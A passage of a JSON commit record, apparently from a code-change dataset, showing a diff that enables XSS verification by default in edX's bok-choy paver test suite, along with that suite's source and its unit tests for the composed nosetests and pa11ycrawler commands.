self._expected_command(name=name, verify_xss=False))"]}], "source": "\n\"\"\" Tests for the bok-choy paver commands themselves. Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and store. \"\"\" expected_statement=( \"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \" \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \" \"VERIFY_XSS='{verify_xss}' \" \"nosetests{repo_dir}/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver should ask for the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite('', num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"\" With the above test, validate that num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_invalid_verbosity_and_processes(self): \"\"\" If an invalid combination of verbosity and number of processors is passed in, a BuildFailure should be raised \"\"\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop) def _expected_command(self, report_dir, start_urls): \"\"\" Returns the expected command to run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter=\"1.0-json\" ' '--depth-limit=6 ' ).format( start_urls=' '.join(start_urls), report_dir=report_dir, ) return expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls([ call( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)), ]) ", "sourceWithComments": "\"\"\"\nTests for the bok-choy paver commands themselves.\nRun just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py\n\"\"\"\nimport os\nimport unittest\n\nfrom mock import patch, call\nfrom test.test_support import EnvironmentVarGuard\nfrom paver.easy import BuildFailure\nfrom pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler\n\nREPO_DIR = os.getcwd()\n\n\nclass TestPaverBokChoyCmd(unittest.TestCase):\n    \"\"\"\n    Paver Bok Choy Command test cases\n    \"\"\"\n\n    def _expected_command(self, name, store=None, verify_xss=False):\n        \"\"\"\n        Returns the command that is expected to be run for the given test spec\n        and store.\n        \"\"\"\n\n        expected_statement = (\n            \"DEFAULT_STORE={default_store} \"\n            \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \"\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \"\n            \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"VERIFY_XSS='{verify_xss}' \"\n            \"nosetests {repo_dir}/common/test/acceptance/{exp_text} \"\n            \"--with-xunit \"\n            \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \"\n            \"--verbosity=2 \"\n        ).format(\n            default_store=store,\n            repo_dir=REPO_DIR,\n            shard_str='/shard_' + self.shard if self.shard else '',\n            exp_text=name,\n            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',\n            verify_xss=verify_xss\n        )\n        return expected_statement\n\n    def setUp(self):\n        super(TestPaverBokChoyCmd, self).setUp()\n        self.shard = os.environ.get('SHARD')\n        self.env_var_override = EnvironmentVarGuard()\n\n    def test_default(self):\n        suite = BokChoyTestSuite('')\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_suite_spec(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_class_spec(self):\n        spec = 'test_foo.py:FooTest'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_testcase_spec(self):\n        spec = 'test_foo.py:FooTest.test_bar'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_spec_with_draft_default_store(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='draft')\n        )\n\n    def test_invalid_default_store(self):\n        # the cmd will dumbly compose whatever we pass in for the default_store\n        suite = BokChoyTestSuite('', default_store='invalid')\n        name = 'tests'\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='invalid')\n        )\n\n    def test_serversonly(self):\n        suite = BokChoyTestSuite('', serversonly=True)\n        self.assertEqual(suite.cmd, \"\")\n\n    def test_verify_xss(self):\n        suite = BokChoyTestSuite('', verify_xss=True)\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_verify_xss_env_var(self):\n        self.env_var_override.set('VERIFY_XSS', 'True')\n        with self.env_var_override:\n            suite = BokChoyTestSuite('')\n            name = 'tests'\n            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_test_dir(self):\n        test_dir = 'foo'\n        suite = BokChoyTestSuite('', test_dir=test_dir)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=test_dir)\n        )\n\n    def test_verbosity_settings_1_process(self):\n        \"\"\"\n        Using 1 process means paver should ask for the traditional xunit plugin for plugin results\n        \"\"\"\n        expected_verbosity_string = (\n            \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else ''\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=1)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_2_processes(self):\n        \"\"\"\n        Using multiple processes means specific xunit, coloring, and process-related settings should\n        be used.\n        \"\"\"\n        process_count = 2\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_3_processes(self):\n        \"\"\"\n        With the above test, validate that num_processes can be set to various values\n        \"\"\"\n        process_count = 3\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_invalid_verbosity_and_processes(self):\n        \"\"\"\n        If an invalid combination of verbosity and number of processors is passed in, a\n        BuildFailure should be raised\n        \"\"\"\n        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)\n        with self.assertRaises(BuildFailure):\n            BokChoyTestSuite.verbosity_processes_string(suite)\n\n\nclass TestPaverPa11yCrawlerCmd(unittest.TestCase):\n\n    \"\"\"\n    Paver pa11ycrawler command test cases.  Most of the functionality is\n    inherited from BokChoyTestSuite, so those tests aren't duplicated.\n    \"\"\"\n\n    def setUp(self):\n        super(TestPaverPa11yCrawlerCmd, self).setUp()\n\n        # Mock shell commands\n        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')\n        self._mock_sh = mock_sh.start()\n\n        # Cleanup mocks\n        self.addCleanup(mock_sh.stop)\n\n    def _expected_command(self, report_dir, start_urls):\n        \"\"\"\n        Returns the expected command to run pa11ycrawler.\n        \"\"\"\n        expected_statement = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains=localhost '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher=logout '\n            '--pa11y-reporter=\"1.0-json\" '\n            '--depth-limit=6 '\n        ).format(\n            start_urls=' '.join(start_urls),\n            report_dir=report_dir,\n        )\n        return expected_statement\n\n    def test_default(self):\n        suite = Pa11yCrawler('')\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(suite.pa11y_report_dir, suite.start_urls)\n        )\n\n    def test_get_test_course(self):\n        suite = Pa11yCrawler('')\n        suite.get_test_course()\n        self._mock_sh.assert_has_calls([\n            call(\n                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),\n            call(\n                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),\n        ])\n\n    def test_generate_html_reports(self):\n        suite = Pa11yCrawler('')\n        suite.generate_html_reports()\n        self._mock_sh.assert_has_calls([\n            call(\n                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),\n        ])\n"}, "/pavelib/utils/test/suites/bokchoy_suite.py": {"changes": [{"diff": "\n         self.default_store = kwargs.get('default_store', None)\n         self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n         self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n-        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n+        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))\n         self.extra_args = kwargs.get('extra_args', '')\n         self.har_dir = self.log_dir / 'hars'\n         self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n", "add": 1, "remove": 1, "filename": "/pavelib/utils/test/suites/bokchoy_suite.py", "badparts": ["        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))"], "goodparts": ["        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))"]}], "source": "\n\"\"\" Class used for defining and running Bok Choy acceptance test suite \"\"\" from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils import os try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up tasks(e.g., collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning of environment test_spec -when set, specifies test files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self).__init__(*args, **kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False)) self.extra_args=kwargs.get('extra_args', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None) self.save_screenshots=kwargs.get('save_screenshots', False) def __enter__(self): super(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install() print 'Forums permissions/roles data has been seeded' except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.') print msg else: msg=colorize('green', \"Cleaning up databases...\") print msg sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct the proper combination for use with nosetests. \"\"\" substring=[] if self.verbosity !=DEFAULT_VERBOSITY and self.num_processes !=DEFAULT_NUM_PROCESSES: msg='Cannot pass in both num_processors and verbosity. Quitting' raise BuildFailure(msg) if self.num_processes !=1: substring=[ \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`. \"\"\" msg=colorize('green', \"Importing courses from{}...\".format(self.imports_dir)) print msg if self.imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir}\".format( default_store=self.default_store, import_dir=self.imports_dir ) ) def load_data(self): \"\"\" Loads data into database from db_fixtures \"\"\" print 'Loading data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue to run in the current session unless interrupted. \"\"\" print 'Bok-choy servers running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE={}\".format(self.default_store), \"SCREENSHOT_DIR='{}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), \"VERIFY_XSS='{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, \"depth\": \"all\", \"all_blocks\": \"true\", }) ) auto_auth_params.update({'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains='localhost', report_dir=self.pa11y_report_dir, reporter=\"1.0-json\", dont_go_here=\"logout\", depth=\"6\", ) return cmd_str ", "sourceWithComments": "\"\"\"\nClass used for defining and running Bok Choy acceptance test suite\n\"\"\"\nfrom time import sleep\nfrom urllib import urlencode\n\nfrom common.test.acceptance.fixtures.course import CourseFixture, FixtureError\n\nfrom path import Path as path\nfrom paver.easy import sh, BuildFailure\nfrom pavelib.utils.test.suites.suite import TestSuite\nfrom pavelib.utils.envs import Env\nfrom pavelib.utils.test import bokchoy_utils\nfrom pavelib.utils.test import utils as test_utils\n\nimport os\n\ntry:\n    from pygments.console import colorize\nexcept ImportError:\n    colorize = lambda color, text: text\n\n__test__ = False  # do not collect\n\nDEFAULT_NUM_PROCESSES = 1\nDEFAULT_VERBOSITY = 2\n\n\nclass BokChoyTestSuite(TestSuite):\n    \"\"\"\n    TestSuite for running Bok Choy tests\n    Properties (below is a subset):\n      test_dir - parent directory for tests\n      log_dir - directory for test output\n      report_dir - directory for reports (e.g., coverage) related to test execution\n      xunit_report - directory for xunit-style output (xml)\n      fasttest - when set, skip various set-up tasks (e.g., collectstatic)\n      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C\n      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment\n      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.\n      default_store - modulestore to use when running tests (split or draft)\n      num_processes - number of processes or threads to use in tests. Recommendation is that this\n      is less than or equal to the number of available processors.\n      verify_xss - when set, check for XSS vulnerabilities in the page HTML.\n      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        super(BokChoyTestSuite, self).__init__(*args, **kwargs)\n        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')\n        self.log_dir = Env.BOK_CHOY_LOG_DIR\n        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)\n        self.xunit_report = self.report_dir / \"xunit.xml\"\n        self.cache = Env.BOK_CHOY_CACHE\n        self.fasttest = kwargs.get('fasttest', False)\n        self.serversonly = kwargs.get('serversonly', False)\n        self.testsonly = kwargs.get('testsonly', False)\n        self.test_spec = kwargs.get('test_spec', None)\n        self.default_store = kwargs.get('default_store', None)\n        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n        self.extra_args = kwargs.get('extra_args', '')\n        self.har_dir = self.log_dir / 'hars'\n        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n        self.imports_dir = kwargs.get('imports_dir', None)\n        self.coveragerc = kwargs.get('coveragerc', None)\n        self.save_screenshots = kwargs.get('save_screenshots', False)\n\n    def __enter__(self):\n        super(BokChoyTestSuite, self).__enter__()\n\n        # Ensure that we have a directory to put logs and reports\n        self.log_dir.makedirs_p()\n        self.har_dir.makedirs_p()\n        self.report_dir.makedirs_p()\n        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter\n\n        if not (self.fasttest or self.skip_clean or self.testsonly):\n            test_utils.clean_test_files()\n\n        msg = colorize('green', \"Checking for mongo, memchache, and mysql...\")\n        print msg\n        bokchoy_utils.check_services()\n\n        if not self.testsonly:\n            self.prepare_bokchoy_run()\n        else:\n            # load data in db_fixtures\n            self.load_data()\n\n        msg = colorize('green', \"Confirming servers have started...\")\n        print msg\n        bokchoy_utils.wait_for_test_servers()\n        try:\n            # Create course in order to seed forum data underneath. This is\n            # a workaround for a race condition. The first time a course is created;\n            # role permissions are set up for forums.\n            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()\n            print 'Forums permissions/roles data has been seeded'\n        except FixtureError:\n            # this means it's already been done\n            pass\n\n        if self.serversonly:\n            self.run_servers_continuously()\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)\n\n        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)\n        if self.testsonly:\n            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')\n            print msg\n        else:\n            # Clean up data we created in the databases\n            msg = colorize('green', \"Cleaning up databases...\")\n            print msg\n            sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\")\n            bokchoy_utils.clear_mongo()\n\n    def verbosity_processes_string(self):\n        \"\"\"\n        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct\n        the proper combination for use with nosetests.\n        \"\"\"\n        substring = []\n\n        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:\n            msg = 'Cannot pass in both num_processors and verbosity. Quitting'\n            raise BuildFailure(msg)\n\n        if self.num_processes != 1:\n            # Construct \"multiprocess\" nosetest substring\n            substring = [\n                \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report),\n                \"--processes={}\".format(self.num_processes),\n                \"--no-color --process-timeout=1200\"\n            ]\n\n        else:\n            substring = [\n                \"--with-xunit\",\n                \"--xunit-file={}\".format(self.xunit_report),\n                \"--verbosity={}\".format(self.verbosity),\n            ]\n\n        return \" \".join(substring)\n\n    def prepare_bokchoy_run(self):\n        \"\"\"\n        Sets up and starts servers for a Bok Choy run. If --fasttest is not\n        specified then static assets are collected\n        \"\"\"\n        sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT))\n\n        if not self.fasttest:\n            self.generate_optimized_static_assets()\n\n        # Clear any test data already in Mongo or MySQLand invalidate\n        # the cache\n        bokchoy_utils.clear_mongo()\n        self.cache.flush_all()\n\n        # load data in db_fixtures\n        self.load_data()\n\n        # load courses if self.imports_dir is set\n        self.load_courses()\n\n        # Ensure the test servers are available\n        msg = colorize('green', \"Confirming servers are running...\")\n        print msg\n        bokchoy_utils.start_servers(self.default_store, self.coveragerc)\n\n    def load_courses(self):\n        \"\"\"\n        Loads courses from self.imports_dir.\n\n        Note: self.imports_dir is the directory that contains the directories\n        that have courses in 